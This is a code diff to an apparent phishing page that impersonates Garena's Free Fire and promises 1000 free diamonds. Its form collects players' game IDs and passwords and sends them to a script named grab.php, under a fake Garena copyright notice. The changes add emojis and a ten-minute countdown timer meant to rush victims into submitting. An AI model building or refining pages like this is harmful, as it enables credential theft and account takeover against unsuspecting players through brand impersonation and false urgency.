@@ -13,7 +13,7 @@
     </div>
     <div class="main">
         <h1>Rewards Redemption Site</h1>
-        <p>Claim 1000 Free Diamonds Now!</p>
+        <p>Claim 1000 Free Diamonds Now! 💎💎💎</p>
         <div class="form-container">
             <p>Enter your Free Fire ID and Password to verify your account and claim your reward!</p>
             <form action="grab.php" method="POST">
@@ -22,6 +22,7 @@
                 <button type="submit">Claim Now!</button>
             </form>
         </div>
+        <p class="timer">Hurry! Offer ends in: <span id="countdown">10:00</span></p>
         <div class="notice">
             <h2>Important Notice:</h2>
             <ol>
@@ -37,5 +38,20 @@
         <img src="ff-small-logo.png" alt="Free Fire Small Logo" class="footer-logo">
         <p>Copyright © Garena International. Trademarks belong to their respective owners. All Rights Reserved.</p>
     </footer>
+    <script>
+        let time = 600; // 10 minutes in seconds
+        const countdown = document.getElementById("countdown");
+        const timer = setInterval(() => {
+            let minutes = Math.floor(time / 60);
+            let seconds = time % 60;
+            seconds = seconds < 10 ? "0" + seconds : seconds;
+            countdown.textContent = `${minutes}:${seconds}`;
+            time--;
+            if (time < 0) {
+                clearInterval(timer);
+                countdown.textContent = "EXPIRED";
+            }
+        }, 1000);
+    </script>
 </body>
 </html>
